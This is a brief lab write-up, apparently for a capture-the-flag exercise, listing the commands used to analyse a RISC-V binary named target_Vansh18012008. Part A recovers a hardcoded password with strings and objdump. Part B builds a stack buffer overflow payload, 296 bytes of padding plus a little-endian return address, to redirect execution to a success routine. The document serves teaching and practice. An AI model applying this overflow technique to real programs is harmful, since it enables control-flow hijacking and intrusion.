PART A

"file target_Vansh18012008" Checks the file type to confirm it is a RISC-V 64-bit executable.

"riscv64-linux-gnu-objdump -d target_Vansh18012008" Disassembles the binary into readable assembly code to trace the main function.

"strings -t x target_Vansh18012008" Extracts all printable strings and their hex offsets. This was used to identify the hardcoded password.

"./target_Vansh18012008 < payload.txt" Runs the executable using the discovered password stored in payload.txt.


PART B

"riscv64-linux-gnu-objdump -d target_Vansh18012008" Used to find the address of the .pass code block (Target: 0x104e8) and calculate the stack offsets.

"python3 -c "import sys; sys.stdout.buffer.write(b'A'*296 + b'\xe8\x04\x01\x00\x00\x00\x00\x00')"" Generates the malicious payload.

 -> b'A'*296: Padding to fill the buffer and reach the ra.

 -> b'\xe8\x04\x01...': The address 0x104e8 in Little Endian format.

"./target_Vansh18012008 < payload" Executes the attack. When the function finishes, instead of returning to the original caller, it "returns" to the address we injected (0x104e8), triggering the success message.
